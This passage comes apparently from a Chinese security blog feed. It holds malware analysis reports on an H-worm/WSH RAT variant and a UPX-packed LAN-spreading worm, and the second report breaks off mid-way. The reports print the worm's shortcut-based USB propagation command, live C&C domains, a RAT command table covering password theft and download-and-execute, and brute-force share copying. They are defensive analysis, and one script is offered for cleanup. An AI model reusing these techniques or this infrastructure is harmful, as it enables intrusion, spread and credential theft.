color=red>upstart()</font>,修改注册表</p><p>HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run&lt;filename&gt;<br>HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run&lt;filename&gt;</p><p>并将自身文件拷贝到installdir目录下和开机自启动文件目录下，代码如下图：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568871796431.png" alt="1568871796431"></p><h4 id="感染可移动硬盘，实现传播"><a href="#感染可移动硬盘，实现传播" class="headerlink" title="感染可移动硬盘，实现传播"></a>感染可移动硬盘，实现传播</h4><p>函数<font color=red>install</font>，首先判断磁盘类型，当磁盘类型为可移动磁盘时，将自身复制到可移动磁盘中，并添加隐藏和系统属性，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568872269934.png" alt="1568872269934">然后再遍历所有文件，将所有文件属性设置为隐藏，并创建同名文件的快捷方式，该快捷方式执行命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c start &lt;拷贝后的js文件(病毒文件本身)&gt; &amp; &lt;可移动磁盘中的原文件&gt; &amp; exit</span><br></pre></td></tr></table></figure><p>并通过查询注册表，获取文件的图标，将快捷方式的图标替换为文件原本图标。这样做的目的就是迷惑使用者打开伪装成正常文件的快捷方式，而该快捷方式会执行恶意程序，最终达到传播感染的目的。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568873846687.png" alt="1568873846687"></p><p>然后还遍历了所有文件夹，并执行了跟文件一样的操作，目的依旧是迷惑使用者运行恶意程序，最终实现通过可移动设备传播感染的目的。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568873952855.png" alt="1568873952855"></p><h4 id="向C-amp-C发送信息，并接受指令"><a href="#向C-amp-C发送信息，并接受指令" class="headerlink" title="向C&amp;C发送信息，并接受指令"></a>向C&amp;C发送信息，并接受指令</h4><p>函数<font color=red>post</font>,将获取到的<font color=red>主机信息</font>，发送到C&amp;C服务器，并返回接收到的指令。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568874628464.png" alt="1568874628464"></p><p>函数<font color=red>post</font>发送的数据的域名会根据函数的第一个参数，进行改变，如下图中post的 第一个参数为“is-ready”，那么该post发送数据的域名就为：unknownsoft.duckdns.org：7744/is-ready，也就是在行为分析中抓到的大量请求包的域名，可见行为分析图4。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568874790418.png" alt="1568874790418"></p><ul><li><p>其中函数<font color=red>information</font>,会获取主机信息。获取的信息如下表:</p><table><thead><tr><th>获取的主机信息有：</th></tr></thead><tbody><tr><td>获取逻辑磁盘卷序列号信息</td></tr><tr><td>获取主机名信息</td></tr><tr><td>获取用户名信息</td></tr><tr><td>获取所含有的杀软信息</td></tr><tr><td>获取操作系统版本信息</td></tr></tbody></table></li></ul><p><font color=red>information</font>函数如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568875219107.png" alt="1568875219107"></p><h4 id="根据接收的指令，执行相应操作"><a href="#根据接收的指令，执行相应操作" class="headerlink" title="根据接收的指令，执行相应操作"></a>根据接收的指令，执行相应操作</h4><p>该样本不仅传播扩散自身，样本本身也是一个强大的远控木马。根据从C&amp;C服务器接收到的指令，执行相应的操作，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568875879288.png" alt="1568875879288"></p><p>其中所有的指令及功能都汇聚在下表中：</p><blockquote><table><thead><tr><th>接收到的指令</th><th>执行相应的操作</th></tr></thead><tbody><tr><td>disconnect</td><td>断开连接，关闭程序</td></tr><tr><td>reboot</td><td>重启操作系统</td></tr><tr><td>shutdown</td><td>关闭计算机</td></tr><tr><td>excecute</td><td>执行接收到的指令2</td></tr><tr><td>install-sdk</td><td>下载SDK文件，并解压</td></tr><tr><td>get-pass</td><td>获取浏览器密码，并解密后的密码发送到C&amp;C服务器</td></tr><tr><td>get-pass-offline</td><td>离线模式获取浏览器密码，大体与get-pass一样</td></tr><tr><td>update</td><td>更新&lt;installdir目录&gt;下的文件</td></tr><tr><td>uninstall</td><td>删除自身，清除所有远控木马程序的痕迹</td></tr><tr><td>up-n-exec</td><td>从C&amp;C服务器，下载文件，并执行</td></tr><tr><td>bring-log</td><td>将&lt;wshlogs\cmd[1]&gt;文件中保存的日志内容，发送到C&amp;C服务器</td></tr><tr><td>down-n-exec</td><td>从指定URL，下载文件，并执行</td></tr><tr><td>filemanager</td><td>从指定URL下载fm-plugin.exe，并运行</td></tr><tr><td>rdp</td><td>从指定URL下载rd-plugin.exe，并运行</td></tr><tr><td>keylogger</td><td>从指定URL下载kl-plugin.exe，并以参数为0运行</td></tr><tr><td>offline-keylogger</td><td>从指定URL下载kl-plugin.exe，并以参数为1运行</td></tr><tr><td>browse-logs</td><td>将&lt;installdir\wshlogs&gt;文件夹下的所有文件和文件夹信息发送到C&amp;C服务器</td></tr><tr><td>cmd-shell</td><td>执行接受到的DOS命令，并将执行结果发送到C&amp;C服务器</td></tr><tr><td>get-processes</td><td>将获取当前进程信息，发送到C&amp;C服务器</td></tr><tr><td>disable-uac</td><td>关闭UAC，并向C&amp;C服务器更新状态</td></tr><tr><td>check-eligible</td><td>检测指定文件是否存在，并向C&amp;C服务器更新状态</td></tr><tr><td>force-eligible</td><td>检测当前执行权限，可执行DOS命令，并向C&amp;C服务器更新状态</td></tr><tr><td>elevate</td><td>以管理员权限运行</td></tr><tr><td>if-elevate</td><td>判断执行参数中有无“elevated”，并将判断结果发往C&amp;C服务器</td></tr><tr><td>kill-process</td><td>根据接收到的PID，结束指定进程</td></tr><tr><td>sleep</td><td>根据接收到的值，进行睡眠</td></tr></tbody></table></blockquote><h1 id="0x02-样本溯源"><a href="#0x02-样本溯源" class="headerlink" title="0x02 样本溯源"></a>0x02 样本溯源</h1><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td>unknownsoft.duckdns.org：7744</td></tr><tr><td>globalization.duckdns.org：50071</td></tr></tbody></table><p>根据下图中的skype的信息，可以查找到该样本的相关信息，搜索结果与该样本大致一致。可知该样本是名为<font color=red>H-worm</font>的蠕虫病毒变种。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568880382170.png" alt="1568880382170"></p><p>继续查<font color=red>H-Worm</font>,就能查到其他厂商相关的分析报告，可从中知该样本是基于VBS（Visual Basic Script）的Houdini蠕虫（H-Worm）的最新变种，其中Houdini蠕虫最初是在2013年开发和传播的。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568881017249.png" alt="1568881017249"></p><p>链接为：<a href="http://www.mottoin.com/detail/4066.html">http://www.mottoin.com/detail/4066.html</a></p><h1 id="0x03-查杀方案"><a href="#0x03-查杀方案" class="headerlink" title="0x03 查杀方案"></a>0x03 查杀方案</h1><h2 id="利用自身脚本进行查杀"><a href="#利用自身脚本进行查杀" class="headerlink" title="利用自身脚本进行查杀"></a>利用自身脚本进行查杀</h2><p>由于该远控软件中有删除自身的功能，且删除自身还是比较干净，因此可以利用该代码进行查杀，代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uninstall</span>(<span class="params"></span>)                        //函数：卸载远控木马，清除所有远控木马程序的痕迹</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//|-------------------------------删除文件，删除自启动项-------------------------------------|</span></span><br><span class="line">        <span class="keyword">var</span> filename;</span><br><span class="line">        <span class="keyword">var</span> foldername;</span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123;</span><br><span class="line">                                                <span class="comment">//删除注册表:HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\&lt;filename&gt; </span></span><br><span class="line">                                                <span class="comment">//删除注册表:HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\&lt;filename&gt;</span></span><br><span class="line">            WScript.Shell.RegDelete(<span class="string">&quot;HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\&quot;</span> + self_fileName.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line">            WScript.Shell.RegDelete(<span class="string">&quot;HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\&quot;</span> + self_fileName.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ei) &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123;</span><br><span class="line">                                                <span class="comment">//删除自启动文件夹下的该文件</span></span><br><span class="line">            scripting.filesystemobject.deleteFile(startup + self_fileName, <span class="literal">true</span>);</span><br><span class="line">                                                <span class="comment">//删除正在运行的文件自身</span></span><br><span class="line">            scripting.filesystemobject.deleteFile(WScript.scriptFullName, <span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (eej) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//|--------------------------------恢复移动硬盘文件-------------------------------------------|</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> dri = <span class="keyword">new</span> Enumerator(scripting.filesystemobject.drives); !dri.atEnd(); dri.moveNext()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> drive = dri.item();</span><br><span class="line">            <span class="keyword">if</span> (drive.isready == <span class="literal">true</span>)          <span class="comment">//判断磁盘是否存在</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (drive.freespace &gt; <span class="number">0</span>)        <span class="comment">//判断磁盘可用空间大小是否大于0</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (drive.drivetype == <span class="number">1</span>)   <span class="comment">//判断是否是可移动磁盘</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> fi = <span class="keyword">new</span> Enumerator(scripting.filesystemobject.getfolder(drive.path + <span class="string">&quot;\\&quot;</span>).files); !fi.atEnd(); fi.moveNext()) </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> file = fi.item();</span><br><span class="line">                            <span class="keyword">try</span> </span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (file.name.indexOf(<span class="string">&quot;.&quot;</span>)) </span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">if</span> ((file.name.split(<span class="string">&quot;.&quot;</span>)[file.name.split(<span class="string">&quot;.&quot;</span>).length - <span class="number">1</span>]).toLowerCase() != <span class="string">&quot;lnk&quot;</span>) </span><br><span class="line">                                    &#123;</span><br><span class="line">                                        file.attributes = <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">if</span> (file.name.toUpperCase() != self_fileName.toUpperCase()) </span><br><span class="line">                                        &#123;</span><br><span class="line">                                            filename = file.name.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">                                            scripting.filesystemobject.deleteFile(drive.path + <span class="string">&quot;\\&quot;</span> + filename[<span class="number">0</span>] + <span class="string">&quot;.lnk&quot;</span>); <span class="comment">//删除链接文件</span></span><br><span class="line">                                        &#125; </span><br><span class="line">                                        <span class="keyword">else</span> </span><br><span class="line">                                        &#123;</span><br><span class="line">                                            scripting.filesystemobject.deleteFile(drive.path + <span class="string">&quot;\\&quot;</span> + file.name); <span class="comment">//删除脚本文件</span></span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> </span><br><span class="line">                                    &#123;</span><br><span class="line">                                        scripting.filesystemobject.deleteFile(file.path);       <span class="comment">//删除脚本文件</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (ex) &#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> fi = <span class="keyword">new</span> Enumerator(scripting.filesystemobject.getfolder(drive.path + <span class="string">&quot;\\&quot;</span>).subFolders); !fi.atEnd(); fi.moveNext()) </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> folder = fi.item();</span><br><span class="line">                            folder.attributes = <span class="number">0</span>;     <span class="comment">//还原文件属性</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;&#125;</span><br><span class="line">    WScript.quit();</span><br><span class="line">&#125;</span><br><span class="line">uninstall();</span><br></pre></td></tr></table></figure><p><strong>直接复制出来，保存到一个js文件，然后运行就可以进行查杀。</strong></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>该恶意样本是H-worm病毒的变种，是蠕虫病毒与远控木马的结合，伪装成.sct文件，进行传播。当该样本执行起来，会自动添加自启动项，感染可移动设备（可通过移动设备进行传播），并会从C&amp;C服务器上接收指令，执行不同的操作。该样本的远控功能完事，能够盗取受害者的网络浏览器和电子邮件客户端的密码、远程控制目标计算机、上传、下载执行文件以及执行远程脚本和命令等，同时它还具有键盘记录，对抗安全软件等多种功能。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 非PE脚本语言样本 </tag>
            
            <tag> 蠕虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sample远控分析报告</title>
      <link href="2019/09/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/"/>
      <url>2019/09/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<center><font size =8> <b>sample.exe分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>sample.exe</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>远控、蠕虫病毒</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>27.5KB（28,160字节）</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>4D049BC 19B03572EF8A00980050BAFFF</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>经过分析，该病毒样本是一个远控与蠕虫病毒的结合体，通过弱口令进行爆破局域网内的主机，进行传播。并通过访问两个C&amp;C服务器接收远程指令，根据接收到的指令执行不同的操作，包括：下载文件并执行，更新自身，DDOS等任务。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/sample.exe.png" alt="sample.exe"></p><h1 id="0x01-样本细节详细分析"><a href="#0x01-样本细节详细分析" class="headerlink" title="0x01 样本细节详细分析"></a>0x01 样本细节详细分析</h1><h2 id="样本行为分析"><a href="#样本行为分析" class="headerlink" title="样本行为分析"></a>样本行为分析</h2><h3 id="大量网络行为"><a href="#大量网络行为" class="headerlink" title="大量网络行为"></a>大量网络行为</h3><p>运行样本后， 该样本进行了大量的网络请求，其中不断尝试与内网IP地址<font color=red>192.168.1.107:83</font>进行连接。如图1</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568536102575.png" alt="1568536102575"></p><center>图1</center><p>然后通过fiddler抓取到，该样本访问<font color=red>异常URL，下载telnet.exe</font>。并且不断尝试与内网网段进行连接，如图2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568537695315.png" alt="1568537695315"></p><center>图2</center><h2 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h2><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>首先用查壳工具查下壳，发现该样本是<font color=red>UPX</font>壳。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568193338945.png" alt="1568193338945"></p><p>然后尝试用OD进行脱壳，F8单步执行一次，然后在ESP下硬件断点，F9运行到该硬件断点处，再单步几次就到了OEP处。然后dump下来，并用ImportREC工具修复IAT，但发现再该OEP处<font color=red>无法找到有用的信息</font>。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568193802608.png" alt="1568193802608"></p><p>这时再拿查壳工具查一下dump出来的文件，发现<font color=red>还有一层UPX壳</font>，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568195358436.png" alt="1568195358436"></p><p>所以目前的IAT表肯定是无法修复的，继续用OD单步跟，寻找下一个<font color=red>OEP</font>。单步几步就会发现，该壳程序通过<font color=red>LoadLibrary和GetProcAddress</font>获取了一些壳所需要的API，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568203038353.png" alt="1568203038353"></p><p>随后继续单步，发现该壳程序通过获取到的virtualAlloc开辟了一段空间，并往里存储了一些数据，然后将其全部释放掉了。这里我们不管，我们只寻找下一个<font color=red>pushad</font>。再走没几步，就发现了<font color=red>pushad</font>，这里再进行一次<font color=red>UPX脱壳</font>。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568203614365.png" alt="1568203614365"></p><p>然后继续单步，直到一个大跳便会跳到函数入口。出现如下图的55 8BEC。便可以dump下来，修复IAT表了。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568204331597.png" alt="1568204331597"></p><h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><p>先创建名为<font color=red>121212</font>的互斥体，然后进行判断，若互斥体存在，则退出当前进程。若不存在则执行主要行为函数<font color=red>sub_404BD7</font>。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568537469886.png" alt="1568537469886"></p><h3 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h3><p>创建一个名为<font color=red>.Net CLR</font>的服务，并设置该服务的状态。创建服务的目的可能是用来守护该进程。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568538257839.png" alt="1568538257839"></p><h3 id="再次创建互斥体"><a href="#再次创建互斥体" class="headerlink" title="再次创建互斥体"></a>再次创建互斥体</h3><p>再次创建名为<font color=red>.Net CLR</font>的互斥体，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568539531920.png" alt="1568539531920"></p><h3 id="枚举资源"><a href="#枚举资源" class="headerlink" title="枚举资源"></a>枚举资源</h3><p>通过调用上图中的<font color=red>EnumResourceNames</font>函数，枚举二进制模块中的资源，并将读取到的资源写入<font color=red>hra33.dll</font>中。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568540312153.png" alt="1568540312153"></p><h3 id="更新资源段"><a href="#更新资源段" class="headerlink" title="更新资源段"></a>更新资源段</h3><p>先检索注册表项<font color=red>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.Net CLR</font>中的ImagePath的值。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568541164659.png" alt="1568541164659"></p><p>然后更新从ImagePath中获取的文件的资源段数据。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568541902631.png" alt="1568541902631"></p><h3 id="加载释放的文件"><a href="#加载释放的文件" class="headerlink" title="加载释放的文件"></a>加载释放的文件</h3><p>先拼接出<font color=red>hra33.dll</font>,再通过LoadLibrary加载该模块。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568545252074.png" alt="1568545252074"></p><h3 id="创建三个线程"><a href="#创建三个线程" class="headerlink" title="创建三个线程"></a>创建三个线程</h3><p>连续创建了3个线程，其中<font color=red>第三个线程是一个死循环</font>，不断创建执行线程3。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568547969803.png" alt="1568547969803"></p><h3 id="线程1：传播扩散"><a href="#线程1：传播扩散" class="headerlink" title="线程1：传播扩散"></a>线程1：传播扩散</h3><ul><li><p><strong>初始化字典</strong></p><p>首先初始化了一个简单的字典，后面用来弱口令爆破，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568548103805.png" alt="1568548103805"></p></li><li><p><strong>将主机号与网络号拼接成IP地址</strong></p><p>通过图中<font color=red>gethostbyname</font>函数获取当前主机的IP地址信息，然后获取当前主机IP地址的所处的网段信息<font color=red>（网络号）</font>，并与初始化的<font color=red>主机号：inc_IP_408724</font>进行拼接，将网络号与主机号进行拼接，IP地址：<font color=red>10.95.16.1</font>。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568548635418.png" alt="1568548635418"></p></li><li><p><strong>弱口令爆破该网段的所有主机</strong></p><p>利用如图黄色标识的<font color=red>主机号：inc_IP_408724</font>,然后与当前主机所在的网段<font color=red>（网络号）</font>拼接出的IP地址。通过调用如下图函数<font color=red>WNetAddCon_copy_exec_402A40</font>，利用之前初始话的字典，进行爆破传播。然后执行完一个IP后，主机号自加1，爆破该网段的下一个地址。直到主机号为254时停止。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568549042369.png" alt="1568549042369"></p></li><li><p><strong>爆破传播函数<font color=red>WNetAddCon_copy_exec_402A40</font></strong></p><p><font color=red>WNetAddCon_copy_exec_402A40</font>传入了三个值，分别是IP地址，用户名，密码。通过调用<font color=red>WNetAddConnection函数</font>,用之前初始化的字典（用户名，密码），对该网段的网络资源进行连接。</p><p>若连接成功，将自身文件拷贝到网络共享资源的多个盘符中，看哪个盘符可以拷贝成功。当拷贝成功便跳到<font color=red>LABEL_14:</font>再两分钟后运行复制后的程序，<font color=red>从而达到通网段的传播</font>。拷贝的目标盘符，如下表：</p><table><thead><tr><th>拷贝的目标盘符：</th></tr></thead><tbody><tr><td>\10.95.16.1\admin$\g1fd.exe</td></tr><tr><td>\10.95.16.1\c$\NewArean.exe</td></tr><tr><td>\10.95.16.1\D$\g1fd.exe</td></tr><tr><td>\10.95.16.1\E$\g1fd.exe</td></tr><tr><td>\10.95.16.1\F$\g1fd.exe</td></tr></tbody></table><p>创建网络资源连接，复制自身代码如下图：</p><p><img 